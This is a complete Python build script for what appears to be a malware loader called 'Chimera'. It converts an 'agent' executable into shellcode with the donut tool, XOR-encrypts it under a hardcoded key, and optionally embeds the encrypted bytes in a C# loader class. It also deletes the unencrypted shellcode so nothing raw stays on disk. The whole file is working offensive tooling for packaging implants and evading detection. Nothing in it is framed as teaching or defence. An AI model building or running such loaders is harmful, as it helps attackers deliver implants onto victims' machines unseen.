#!/usr/bin/env python3
"""
build_loader.py — Chimera loader build helper

Steps:
  1. Runs donut on chimera.exe to produce shellcode.bin
  2. XOR-encrypts shellcode.bin -> shellcode.bin.enc
  3. Optionally embeds shellcode as C# byte array in Loader.cs

Usage:
  python build_loader.py --agent chimera.exe [--embed]

Requirements:
  - donut.exe (or donut on Linux) in PATH or same directory
    Download: https://github.com/TheWover/donut/releases
  - Python 3.6+
"""

import argparse
import os
import subprocess
import struct
import sys

XOR_KEY = b"ChimeraKey2024!!"  # Must match Loader.cs


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))


def run_donut(agent_path: str, out_path: str) -> bool:
    """Run donut to convert EXE -> shellcode."""
    donut_bin = "donut"
    if os.name == "nt":
        donut_bin = "donut.exe"
        if not os.path.exists(donut_bin):
            donut_bin = os.path.join(os.path.dirname(__file__), "donut.exe")

    cmd = [
        donut_bin,
        "-i", agent_path,
        "-o", out_path,
        "-a", "1",   # x86
        "-f", "1",   # output format: raw shellcode
        "-b", "1",   # AMSI/WLDP bypass: none (we handle ourselves)
        "-e", "3",   # entropy: random variable names + string encryption
    ]

    print(f"[*] Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode != 0:
        print(f"[-] donut failed:\n{result.stderr}")
        return False

    print(f"[+] donut output: {out_path}")
    return True


def embed_as_csharp(shellcode_enc: bytes, output_path: str):
    """Write shellcode as C# byte array for embedding directly in loader."""
    hex_bytes = ", ".join(f"0x{b:02x}" for b in shellcode_enc)
    cs = f"""// Auto-generated by build_loader.py — do not edit manually
// Embed this class in Loader.cs and replace the File.ReadAllBytes() call
// with: byte[] encrypted = ShellcodeData.Bytes;

namespace ChimeraLoader
{{
    internal static class ShellcodeData
    {{
        internal static readonly byte[] Bytes = new byte[] {{
            {hex_bytes}
        }};
    }}
}}
"""
    with open(output_path, "w") as f:
        f.write(cs)
    print(f"[+] Embedded shellcode written to: {output_path}")


def main():
    parser = argparse.ArgumentParser(description="Chimera loader builder")
    parser.add_argument("--agent", required=True, help="Path to compiled chimera.exe")
    parser.add_argument("--embed", action="store_true",
                        help="Also generate ShellcodeData.cs for embedding")
    args = parser.parse_args()

    if not os.path.exists(args.agent):
        print(f"[-] Agent not found: {args.agent}")
        sys.exit(1)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    raw_path   = os.path.join(script_dir, "shellcode.bin")
    enc_path   = os.path.join(script_dir, "shellcode.bin.enc")

    # Step 1: donut
    if not run_donut(args.agent, raw_path):
        sys.exit(1)

    # Step 2: XOR encrypt
    with open(raw_path, "rb") as f:
        raw = f.read()

    encrypted = xor_encrypt(raw, XOR_KEY)

    with open(enc_path, "wb") as f:
        f.write(encrypted)

    print(f"[+] Encrypted shellcode: {enc_path} ({len(encrypted)} bytes)")

    # Step 3: optionally embed
    if args.embed:
        embed_path = os.path.join(script_dir, "ShellcodeData.cs")
        embed_as_csharp(encrypted, embed_path)
        print("[*] To embed: add ShellcodeData.cs to your Loader.cs compile command")
        print("[*] Replace File.ReadAllBytes() call with: byte[] encrypted = ShellcodeData.Bytes;")

    # Cleanup raw shellcode (don't leave unencrypted on disk)
    os.remove(raw_path)
    print(f"[+] Cleaned up raw shellcode")
    print(f"\n[+] Done. Place shellcode.bin.enc next to loader.exe when running.")
    print(f"[+] Or use --embed to bake it in at compile time (no external file needed).")


if __name__ == "__main__":
    main()
